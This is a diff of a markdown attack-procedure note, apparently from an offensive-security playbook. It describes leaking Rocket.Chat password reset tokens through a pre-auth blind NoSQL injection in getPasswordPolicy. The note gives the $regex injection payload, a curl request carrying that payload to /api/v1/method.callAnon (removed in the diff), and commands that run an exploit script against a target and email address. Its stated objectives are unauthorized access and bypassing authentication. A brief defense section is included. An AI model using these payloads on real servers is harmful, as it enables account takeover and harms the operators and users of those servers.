@@ -1,5 +1,4 @@
 ---
-id: proc-rocket-token-leak
 tags:
   - nosql-injection
   - blind-injection
@@ -8,115 +7,105 @@ type: procedure
 tools:
   - '[[tools/Python3]]'
   - '[[tools/requests]]'
-  - '[[tools/pre-auth-nosqli-py]]'
+  - '[[tools/pre_auth_nosqli.py]]'
 tactics:
-  - '[[Initial Access]]'
   - '[[Credential Access]]'
-commands:
-  - '[[commands/run-pre-auth-nosqli-exploit]]'
+commands: []
 verified: false
 platforms:
   - Web
-  - Linux
 submitted: true
 created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[Exploit Public-Facing Application]]'
-  - '[[Credentials In Files]]'
-updated_at: '2025-12-14T03:46:19.929Z'
+updated_at: '2025-12-14T17:31:30.571Z'
 skill_level: intermediate
 impact_level: high
 detection_risk: medium
 sub_techniques: []
+id: 7f5aff2b-23ee-4782-8e74-322764bb0e97
 validated: true
 mitre_tactics:
-  - '[[Initial Access]]'
   - '[[Credential Access]]'
 mitre_techniques:
   - '[[Exploit Public-Facing Application]]'
-  - '[[Credentials In Files]]'
 ---
 # Leak-Password-Reset-Token-via-Blind-NoSQL-Injection
 
 ## Summary
 
-This procedure exploits a blind NoSQL injection in Rocket.Chat's getPasswordPolicy method to leak the password reset token character-by-character using MongoDB $regex operators via the unauthenticated /api/v1/method.callAnon endpoint.
+This procedure exploits a pre-auth blind NoSQL injection in Rocket.Chat's getPasswordPolicy method to extract password reset tokens character by character using MongoDB $regex operator.
 
 ## Description
 
-The 'token' parameter is directly injected into a MongoDB query without sanitization, allowing payloads like {"token":{"$regex":"^A"}} to test prefixes. Successful matches return the password policy JSON (true branch), while mismatches error out (false). Iterate over positions (e.g., 1-32 chars) and charset (alphanumeric + symbols) to reconstruct the full token. Requires prior password reset and Python for automation.
+The 'token' parameter in /api/v1/method.callAnon lacks sanitization, allowing injection of operators like {"$regex":"^A"} to match token prefixes. By observing response differences (policy on match, error on mismatch), the full token is guessed positionally. Targets MongoDB queries for reset tokens. Prerequisites include a generated token from prior reset.
 
 ## Requirements
 
-1. Running Rocket.Chat instance with vulnerable getPasswordPolicy
-2. Leaked token from prior reset step
-3. Python3 with requests library
-4. Target URL and email
+1. Vulnerable Rocket.Chat instance (e.g., 3.12.1)
+2. Access to anonymous method call endpoint
+3. Python script for automation
+4. Knowledge of possible charset (alphanumeric)
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Sanitize and validate all input parameters in API methods
-- Use parameterized queries or MongoDB drivers with escaping
-- Monitor for repeated /method.callAnon calls with regex patterns
-- Enable WAF rules for NoSQL operator detection
+- Sanitize inputs to prevent operator injection
+- Use parameterized queries in Node.js/MongoDB
+- Log and alert on anomalous API calls with regex patterns
 
 ## Objectives
 
-1. Extract sensitive reset token from database
-2. Enable unauthorized password reset
-3. Bypass pre-auth controls
+1. Extract full reset token
+2. Enable unauthorized access
+3. Bypass auth without credentials
 
 ## Instructions
 
-### Step 1: Run the Exploit Script for Token Leaking
+### Step 1: Craft and Send Injection Payloads
 
-**Context**: The custom script automates blind injection by sending DDP-formatted payloads and parsing responses for boolean outcomes.
+**Context**: Iterate over token length (assume 32 chars) and charset to build the token.
 
-**Command** ([[commands/run-pre-auth-nosqli-exploit]]):
+**Command** ([[commands/run-exploit-script]]):
 ```bash
-python3 pre_auth_nosqli.py 'http://target:3000' 'target@example.com'
+python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --leak-token
 ```
 
-> The script outputs progress like "Guessing position 1: A (success)" and finally the full token. Errors indicate invalid guesses; adjust charset if needed.
+> Script sends payloads like {"token":{"$regex":"^A"}} to getPasswordPolicy. Matches return policy JSON; mismatches error. Builds token progressively. Expected output: Full token printed.
 
-### Step 2: Manual Payload Testing (Optional)
+### Step 2: Verify Leak
 
-**Context**: For verification, send individual payloads via curl to test regex matches.
+**Context**: Test partial token in a reset attempt.
 
-**Command** ([[commands/curl-nosql-payload-test]]):
+**Command** ([[commands/run-exploit-script]]):
 ```bash
-curl -X POST 'http://target:3000/api/v1/method.callAnon' -H 'Content-Type: application/json' -d '{"msg":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}],"id":"1"}'
+python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --test-token 'partial_leak'
 ```
 
-> Success: Returns policy JSON; Failure: 401/500 error.
+> Confirms partial matches. Expected: Success if accurate.
 
 ## MITRE ATT&CK Mapping
 
 ### Tactics
 
-- [[Initial Access]]
 - [[Credential Access]]
 
 ### Techniques
 
 - [[Exploit Public-Facing Application]]
-- [[Credentials In Files]]
 
 ### Sub-Techniques
 
 
 ## Commands Used
 
-- [[commands/run-pre-auth-nosqli-exploit]]
-- [[commands/curl-nosql-payload-test]]
 
 ## Tools Used
 
 - [[tools/Python3]]
 - [[tools/requests]]
-- [[tools/pre-auth-nosqli-py]]
+- [[tools/pre_auth_nosqli.py]]
 
 ## Tags
 
